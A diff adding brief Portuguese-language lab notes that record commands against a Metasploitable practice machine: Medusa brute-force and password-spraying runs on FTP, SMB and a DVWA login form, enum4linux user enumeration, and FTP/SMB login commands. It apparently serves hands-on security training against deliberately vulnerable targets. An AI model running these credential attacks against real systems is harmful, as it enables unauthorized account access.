@@ -1,1 +1,24 @@
+OBS: comandos de acordo com o ip do meu Metasploitable (192.168.56.101). Edite conforme suas necessidades
 
+Comando para brute force (FTP):
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
+
+Acesso FTP:
+ftp 192.168.56.101
+
+
+Comando para brute force em formulário Web (DVWA):
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login.php' \ -m FORM:'username=^USER&Login=Login' \ -m 'FAIL=Login failed' -t 6
+
+
+Enumerar os usuários (SMB)
+enum4linux -a 192.168.56.101 | tee enum4_output.txt
+
+Acessar arquivo (txt) criado:
+less enum4_output.txt
+
+Comando para brute force (SMB):
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+Acesso SMB:
+smbclient -L //192.168.56.101 -U msfadmin
